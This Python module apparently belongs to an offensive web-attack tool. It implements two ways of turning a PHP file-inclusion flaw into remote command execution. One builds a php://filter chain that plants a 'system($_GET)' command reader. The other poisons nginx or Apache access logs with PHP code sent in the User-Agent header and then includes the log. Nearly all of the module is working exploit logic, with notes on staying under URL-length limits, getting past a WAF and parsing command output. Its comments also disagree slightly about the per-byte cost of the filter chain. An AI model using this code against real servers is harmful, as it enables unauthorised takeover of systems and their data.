"""Running commands through a generated filter chain.

The chain is built once and reused. A chain that carried the command would be a
new chain per command, and since every byte of payload costs about a hundred and
fifty characters of filter, a chain holding a real command line runs past the
length a web server will accept in a URL - the request is refused before the
application ever sees it.

So the chain carries a reader instead: a short PHP fragment that takes the
command from another parameter. One long request sets the session up, and each
command after that is a normal-sized request. The trade is that the command
travels in the clear in that second parameter, which is the wrong side of a WAF
that inspects values - but a chain that never arrives is worse than one that is
seen.
"""

from __future__ import annotations

import secrets
from urllib.parse import quote, urlsplit, urlunsplit

from ...core.filters import php_runner
from ...core.httpmsg import Request
from ...core.params import Encode, rewrite
from ...engine.inject import inject

# The name the command is passed under. Short, and unlikely to collide with
# something the application already reads.
AUX_PARAM = "c"

# What the chain manufactures. Deliberately tiny: every byte of payload costs
# roughly two hundred and fifty characters of filter chain, and a web server
# enforces a limit on the request line (8190 by default, which this chain stays
# well under). This is the whole reason the command travels in a second parameter
# instead of inside the chain.
#
# A PHP fragment, not a document: the generator opens the tag itself. Writing
# "<?php" here as well produces "<?php <?php ...", which parses as nothing and
# fails without a message.
READER = "system($_GET['%s']);"

# Where the chain ends. An application that reports what it included echoes the
# whole chain back, which makes this a reliable seam to cut at.
CHAIN_TAIL = "resource=php://temp"


class FilterChainShell:
    """A command runner backed by `php://filter` over an include() point."""

    def __init__(self, ctx, param, aux: str = AUX_PARAM, action: str = "os-shell") -> None:
        self.ctx = ctx
        self.param = param
        self.aux = aux
        self.action = action
        self._chain: str | None = None
        self._opened = ""
        self._closed = ""

    def __call__(self, command: str) -> str:
        chain = self._reader()
        request = rewrite(self.ctx.config["request"], self.param, chain, Encode.URL).clone()
        request.url = self._with_command(request.url, command)
        exchange = self.ctx.send(request, action=self.action)
        if exchange.response.error:
            return f"the target did not answer: {exchange.response.error}"
        text = self._extract(exchange.response.text)
        if text is None:
            return (
                "the chain did not run: the response does not contain it. "
                "The application may be refusing the wrapper, or the request "
                "may be arriving truncated."
            )
        return text or "the command ran and printed nothing"

    def _reader(self) -> str:
        """Build the reader chain once and keep it."""
        if self._chain is None:
            self._chain = php_runner(READER % self.aux)
        return self._chain

    def _with_command(self, url: str, command: str) -> str:
        parts = urlsplit(url)
        query = parts.query + ("" if not parts.query else "&") + f"{self.aux}={quote(command, safe='')}"
        return urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))

    def _extract(self, body: str) -> str | None:
        """The command's output, minus whatever the page wraps it in.

        There is no marker to look for: one would push the payload past the
        length a URL can carry. When the application echoes what it included, the
        end of the chain is a clean seam; when it does not, the whole response is
        the output. Either way the chain leaves some bytes of its own after the
        payload, so the result is cut at the first character that is not text.

        None when the chain is not in the response at all - the page did not run
        it, and handing back the body would print a whole HTML document as if it
        were command output.
        """
        index = body.find(CHAIN_TAIL)
        if index == -1:
            return None
        tail = body[index + len(CHAIN_TAIL):].lstrip("-)> \r\n")

        cut = len(tail)
        for position, character in enumerate(tail):
            if ord(character) < 32 and character not in "\n\r\t":
                cut = position
                break
        return tail[:cut].strip()


class LogPoisonShell:
    """A command runner that lives in a file the target writes for itself.

    An include() point is enough to run code when any file the application writes
    can be named. The access log is the one that always exists and always holds
    what the caller sent: nginx and apache both record the User-Agent verbatim,
    so one request whose agent is PHP source leaves that source sitting in a file
    the very same include() will execute.

    This is the route that works when every wrapper is refused. An application
    that accepts nothing containing `://` still hands a plain path to include(),
    and the log path is a plain path.
    """

    def __init__(self, ctx, param, log_path: str, aux: str = AUX_PARAM, action: str = "os-shell") -> None:
        self.ctx = ctx
        self.param = param
        self.log_path = log_path
        self.aux = aux
        self.action = action
        self._planted = False

    def __call__(self, command: str) -> str:
        if not self._planted:
            self._plant()

        # The whole log is included, so every earlier request - other people's
        # traffic and this run's own attempts - is parsed as PHP on the way to
        # the answer, and the command's output ends up somewhere in a wall of
        # text rather than at the start. A marker pair per command is what makes
        # it findable; it is fresh each time so an older run's markers, still in
        # the log, cannot be mistaken for this one's.
        start = "ik" + secrets.token_hex(5)
        end = "ik" + secrets.token_hex(5)
        payload = f"echo {start};{command};echo {end}"

        exchange = self.ctx.send(self._request(payload), action=self.action)
        body = exchange.response.text
        head = body.rfind(start)
        tail = body.rfind(end)
        if head == -1 or tail <= head:
            return self._why_no_marker(body, start)
        return body[head + len(start):tail].strip() or "the command printed nothing"

    @staticmethod
    def _why_no_marker(body: str, marker: str) -> str:
        """Say which of the two ways this failed, because they need different fixes.

        The whole log is included, so its size is the payload's enemy: an
        application that stops reading the file partway through - output
        buffering, a size cap, a slow client - never reaches the line this request
        appended, and the marker is absent for a reason that has nothing to do
        with the log being includable. Reporting both as "the code did not run"
        sends someone to check permissions when the answer is that the file is too
        big to read to the end.
        """
        if len(body) < 4096:
            return (
                "the injected command did not run: the marker never came back and the response "
                "is far smaller than the file, so the log itself may not be includable, or it "
                "may have been rotated between the request that wrote it and the one that read it"
            )
        return (
            "the injected command did not run: the response carries the log but stops before the "
            "end of it, so the line this request appended was never reached. A large log will do "
            "this on its own - the payload has to be near the end of what the application reads, "
            "which means a small file, or one that was emptied first. The marker was: "
            + marker
        )

    def _plant(self) -> None:
        """Leave PHP source in the log, in the one place a server records verbatim.

        Single quotes around the array key, and that is not style. Apache escapes
        the quotes in a request line as it writes them, so a payload written with
        double quotes lands in the log as `$_GET[\\"c\\"]` - and including that
        file is a parse error, not a command. The whole chain fails with the
        server reporting a syntax error it found in its own access log, which is
        a confusing thing to be told. Single quotes need no escaping in a log
        line, and PHP reads the key the same either way.
        """
        request = self.ctx.config["request"].clone()
        request.headers.set("User-Agent", f"<?php system($_GET['{self.aux}']); ?>")
        self.ctx.send(request, action=f"{self.action}.plant")
        self._planted = True

    def _request(self, command: str) -> Request:
        """The include that runs the planted source, with the command beside it."""
        request = rewrite(self.ctx.config["request"], self.param, self.log_path, Encode.URL).clone()
        parts = urlsplit(request.url)
        query = parts.query + ("" if not parts.query else "&") + f"{self.aux}={quote(command, safe='')}"
        request.url = urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))
        return request
